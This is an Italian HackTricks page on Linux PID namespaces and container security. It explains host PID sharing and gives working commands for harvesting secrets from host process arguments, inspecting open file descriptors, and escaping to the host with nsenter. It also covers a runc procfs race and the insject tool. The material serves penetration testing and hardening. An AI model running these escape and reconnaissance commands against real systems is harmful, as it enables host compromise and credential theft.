# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace PID controlla come i processi sono numerati e quali processi sono visibili. Per questo motivo un container può avere il proprio PID 1 anche se non è una macchina reale. All'interno del namespace, il carico di lavoro vede ciò che appare come un albero di processi locale. Fuori dal namespace, l'host vede ancora i PID reali dell'host e l'intero panorama dei processi.

Dal punto di vista della sicurezza, il namespace PID è importante perché la visibilità dei processi è preziosa. Una volta che un carico di lavoro può vedere i processi dell'host, potrebbe essere in grado di osservare i nomi dei servizi, gli argomenti della riga di comando, segreti passati negli argomenti dei processi, lo stato derivato dall'ambiente attraverso `/proc`, e potenziali bersagli per l'accesso ai namespace. Se può fare più che vedere quei processi, per esempio inviando segnali o usando ptrace nelle condizioni giuste, il problema diventa molto più serio.

## Funzionamento

Un nuovo namespace PID inizia con la propria numerazione interna dei processi. Il primo processo creato al suo interno diventa PID 1 dal punto di vista del namespace, il che significa anche che acquisisce semantiche speciali simili a init per i figli orfani e per il comportamento dei segnali. Questo spiega molte stranezze dei container riguardo ai processi init, alla raccolta dei zombie e al motivo per cui talvolta si usano piccoli wrapper init nei container.

La lezione di sicurezza importante è che un processo può sembrare isolato perché vede solo il proprio albero dei PID, ma quell'isolamento può essere rimosso deliberatamente. Docker espone questa possibilità tramite `--pid=host`, mentre Kubernetes lo fa tramite `hostPID: true`. Una volta che il container si unisce al PID namespace dell'host, il carico di lavoro vede direttamente i processi dell'host e molte vie d'attacco successive diventano molto più realistiche.

## Laboratorio

Per creare manualmente un PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
La shell ora vede una vista privata dei processi. Il flag `--mount-proc` è importante perché monta un'istanza di procfs che corrisponde al nuovo PID namespace, rendendo la lista dei processi coerente dall'interno.

Per confrontare il comportamento del container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La differenza è immediata e facile da capire, per questo è un buon primo laboratorio per i lettori.

## Uso a runtime

I container normali in Docker, Podman, containerd e CRI-O ottengono il proprio PID namespace. I Kubernetes Pods di solito ricevono anch'essi una vista PID isolata, a meno che il workload non richieda esplicitamente la condivisione del PID con l'host. Gli ambienti LXC/Incus si basano sulla stessa primitiva del kernel, sebbene i casi d'uso system-container possano esporre alberi di processo più complessi e favorire scorciatoie per il debugging.

La stessa regola vale ovunque: se il runtime ha scelto di non isolare il PID namespace, si tratta di una riduzione deliberata del perimetro del container.

## Misconfigurazioni

La misconfigurazione canonica è la condivisione del PID con l'host. I team spesso la giustificano per debugging, monitoring o comodità nella gestione dei servizi, ma dovrebbe sempre essere considerata un'eccezione significativa dal punto di vista della sicurezza. Anche se il container non dispone di una primitiva di scrittura immediata sui processi dell'host, la sola visibilità può rivelare molto sul sistema. Una volta che vengono aggiunte capabilities come `CAP_SYS_PTRACE` o un accesso utile a procfs, il rischio aumenta significativamente.

Un altro errore è presumere che, poiché il workload non può terminare o usare ptrace sui processi dell'host di default, la condivisione del PID con l'host sia quindi innocua. Tale conclusione ignora il valore dell'enumerazione, la disponibilità di target per l'entry nelle namespace e il modo in cui la visibilità dei PID si combina con altri controlli indeboliti.

## Abuso

Se viene condiviso il PID namespace dell'host, un attaccante può ispezionare i processi dell'host, raccogliere gli argomenti dei processi, identificare servizi interessanti, individuare PIDs candidati per `nsenter`, o combinare la visibilità dei processi con privilegi relativi a ptrace per interferire con i workload dell'host o vicini. In alcuni casi, vedere semplicemente il giusto processo a lunga esecuzione è sufficiente per riformulare il resto del piano d'attacco.

Il primo passo pratico è sempre confermare che i processi dell'host siano realmente visibili:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una volta che gli host PIDs sono visibili, process arguments e namespace-entry targets diventano spesso la fonte di informazione più utile:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Se `nsenter` è disponibile e sono presenti privilegi sufficienti, verifica se un processo host visibile può essere usato come ponte per i namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Anche quando l'accesso è bloccato, la condivisione dei PID dell'host è comunque preziosa perché rivela la disposizione dei servizi, i componenti in esecuzione e i processi privilegiati candidati da prendere di mira successivamente.

La visibilità dei PID dell'host rende inoltre più realistico l'abuso dei file descriptor. Se un processo host privilegiato o un workload vicino ha un file sensibile o una socket aperta, l'attaccante potrebbe essere in grado di ispezionare `/proc/<pid>/fd/` e riutilizzare quel handle a seconda della proprietà, delle opzioni di mount di procfs e del modello di servizio target.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Questi comandi sono utili perché rispondono se `hidepid=1` o `hidepid=2` stanno riducendo la visibilità tra processi e se descrittori chiaramente interessanti come file segreti aperti, log o socket Unix sono visibili.

### Esempio completo: host PID + `nsenter`

La condivisione del PID dell'host diventa un host escape diretto quando il processo ha anche privilegi sufficienti per unirsi ai host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Se il comando riesce, il processo del container viene ora eseguito nei namespace di mount, UTS, network, IPC e PID dell'host. L'impatto è una compromissione immediata dell'host.

Anche quando `nsenter` non è presente, lo stesso risultato può essere ottenuto tramite il binario dell'host se il filesystem dell'host è montato:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Note recenti sul runtime

Alcuni attacchi rilevanti per il PID-namespace non sono le tradizionali misconfigurazioni `hostPID: true`, ma bug di implementazione a runtime riguardo a come le protezioni di procfs vengono applicate durante il setup del container.

#### Race di `maskedPaths` verso il procfs dell'host

Nelle versioni vulnerabili di `runc`, attacker in grado di controllare l'immagine del container o il workload `runc exec` potevano gareggiare nella fase di masking sostituendo il `/dev/null` lato container con un symlink verso un percorso procfs sensibile come `/proc/sys/kernel/core_pattern`. Se la race avesse avuto successo, il bind mount del percorso mascherato poteva finire sul target sbagliato ed esporre al nuovo container le procfs knobs globali dell'host.

Comando utile per la revisione:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Questo è importante perché l'impatto finale può essere lo stesso di una esposizione diretta di procfs: `core_pattern` o `sysrq-trigger` scrivibili, seguiti da host code execution o denial of service.

#### Namespace injection con `insject`

Strumenti di namespace injection come `insject` mostrano che l'interazione con il PID-namespace non richiede sempre di entrare preventivamente nel namespace di destinazione prima della creazione del processo. Un helper può collegarsi in seguito, usare `setns()`, ed eseguire mantenendo la visibilità nello spazio PID target:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Questo tipo di tecnica è rilevante principalmente per il debugging avanzato, offensive tooling e i workflow di post-exploitation in cui il contesto del namespace deve essere raggiunto dopo che il runtime ha già inizializzato il workload.

### Related FD Abuse Patterns

Ci sono due pattern che vale la pena evidenziare quando gli host PIDs sono visibili. Primo, un processo privilegiato può mantenere aperto un file descriptor sensibile attraverso `execve()` perché non è stato marcato `O_CLOEXEC`. Secondo, i servizi possono passare file descriptors su Unix sockets tramite `SCM_RIGHTS`. In entrambi i casi l'oggetto interessante non è più il pathname, ma la handle già aperta che un processo a basso privilegio può ereditare o ricevere.

Questo è rilevante nel lavoro con container perché la handle può puntare a `docker.sock`, a un log privilegiato, a un host secret file, o a un altro oggetto ad alto valore anche quando il percorso stesso non è direttamente raggiungibile dal filesystem del container.

## Checks

Lo scopo di questi comandi è determinare se il processo ha una vista PID privata oppure se può già enumerare un panorama di processi molto più ampio.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Cosa è interessante qui:

- Se l'elenco dei processi contiene servizi evidenti dell'host, host PID sharing è probabilmente già in atto.
- Vedere solo un piccolo albero container-local è il comportamento normale; vedere `systemd`, `dockerd`, o daemons non correlati non lo è.
- Una volta che gli host PID sono visibili, anche le informazioni sui processi in sola lettura diventano una ricognizione utile.

Se scopri un container in esecuzione con host PID sharing, non considerarlo una differenza cosmetica. È un cambiamento importante in ciò che il workload può osservare e potenzialmente influenzare.
{{#include ../../../../../banners/hacktricks-training.md}}
